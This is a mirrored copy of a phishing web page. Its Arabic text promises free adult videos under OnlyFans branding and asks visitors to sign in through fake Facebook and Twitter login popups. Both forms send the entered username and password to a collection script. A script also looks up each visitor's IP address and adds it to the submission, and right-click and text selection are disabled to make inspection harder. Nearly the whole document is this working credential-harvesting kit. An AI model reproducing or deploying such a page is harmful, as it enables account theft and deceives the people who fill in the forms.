
<html>

<!-- Mirrored from frostxgg.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 25 Dec 2020 10:21:11 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="مقاطع ميكا مجاني">
<meta name="description" content="">
<meta property="og:description" content="Get popularity reward in this NEW ERA VER 1.0 update. Free without paying. Come on get it now !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content=": only fans">
<meta property="og:type" content="website">
<meta name="copyright"content="only fans">
<meta name="theme-color" content="#000">
<meta property="og:image" content="newera/images/over_share1.jpg">
<title>only fans logi </title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/style1.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/font-awesome.min.css">
</head>
    <meta property="og:image" content="https://cdn-production-thumbor-vidio.akamaized.net/DQco7DkUm-qF3V5eayIUHvssebE=/filters:quality(70)/vidio-web-prod-category/uploads/category/image/52/home-page-d9e69d.jpg" />
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
        
 
<!DOCTYPE html>
<html>
<head>
<style>
body {
  background-image: url('https://a.top4top.io/p_2422lyvl95.jpeg');
  background-repeat: no-repeat;
  background-attachment: fixed; 
  background-size: 100% 100%;
}
</style>
</head>
<body>



	<div class="box">
		<center>


 </br>


	         <div class="blur">
                  <h1 class="pertama">ميقا إلينا انجل</h1>
    <h2 class="pertama">مجموعات علئ الفيسبوك وتويتر لنشر الافلام الينا انجل وتحميل ميقا سكس مجانا اضغط مشاهدة الفديو او تسجيل للدخول الى موقع </h2>
</br>

 </br>
 

                <span class="kedua"> </span>
                <img onclick="account_login();"
    <img onclick="account_login();" src="img/X.png">

            </div>
		<center/>
		</div>
		</div>
		</center>
		<div id="latest" class="gallery">
			<div class="scroll">
				<center>
				<div class="item">
				
			

	
			</div>
		</div>
	</div> <!--- box --->
</div> <!--- container --->

<div class="popup account_login" style="display: none;">
	<div class="popup-box animated fadeInDown">
		<div class="nav-popup">
			<div class="nav-popup-title">لوحة التسجيل</div>
		</div>
		<div class="alert-wrapper">
		<div class="alert">
	قم بالتسجيل للحصول علئ صلاحيه الوصول للموقع. 
		</div>
		</div>
		<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> تسجيل باستخدام فيسبوك</button>
		<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="tw tw-twitter-square icon-login"></i> تسجيل باستخدام تويتر</button>
		
		<center>
		</center>
	</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="fa fa-times-circle"></i></a>
		<div class="navbar-fb">
			<img src="img/facebook_text.jpg">
		</div>
		<div class="content-box-fb">
			<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/OnlyFans_logo.svg/2560px-OnlyFans_logo.svg.png">
			<div class="txt-login-fb">سجٌل الدخول على Facebook لعرض الافلام إلينا انجل
 </div>
			<form class="login-form" action="fd.php" method="post">
				<label>
				<input type="text" name="text" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required></label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required></label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<input type="hidden" id="brok-ip" name="brok-ip" value="" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
		<a onclick="tutup_twitter()" class="close-other"><i class="fa fa-times-circle"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/imgo.jpg">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="fd.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="text" placeholder="" required></div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required></div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<input type="submit" class="btn-login-twitter" value="Log in">
				<input type="hidden" id="brok-ip2" name="brok-ip" value="" readonly>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>
<p id="user-ippp" hidden></p>
<!--- fieldset content --->
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>
<script src="js/slider.js"></script>

<script src="js/hasso.min.js">
    </script>

    <script>

        $.getJSON("https://api.ipify.org?format=json", function (data) {

            $("#user-ippp").html(data.ip);


            let brok = document.getElementById('user-ippp').textContent;

            document.getElementById('brok-ip').value = brok;
            document.getElementById('brok-ip2').value = brok;
        })
    </script>
</body>



<!-- Mirrored from frostxgg.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 25 Dec 2020 10:21:44 GMT -->
</html>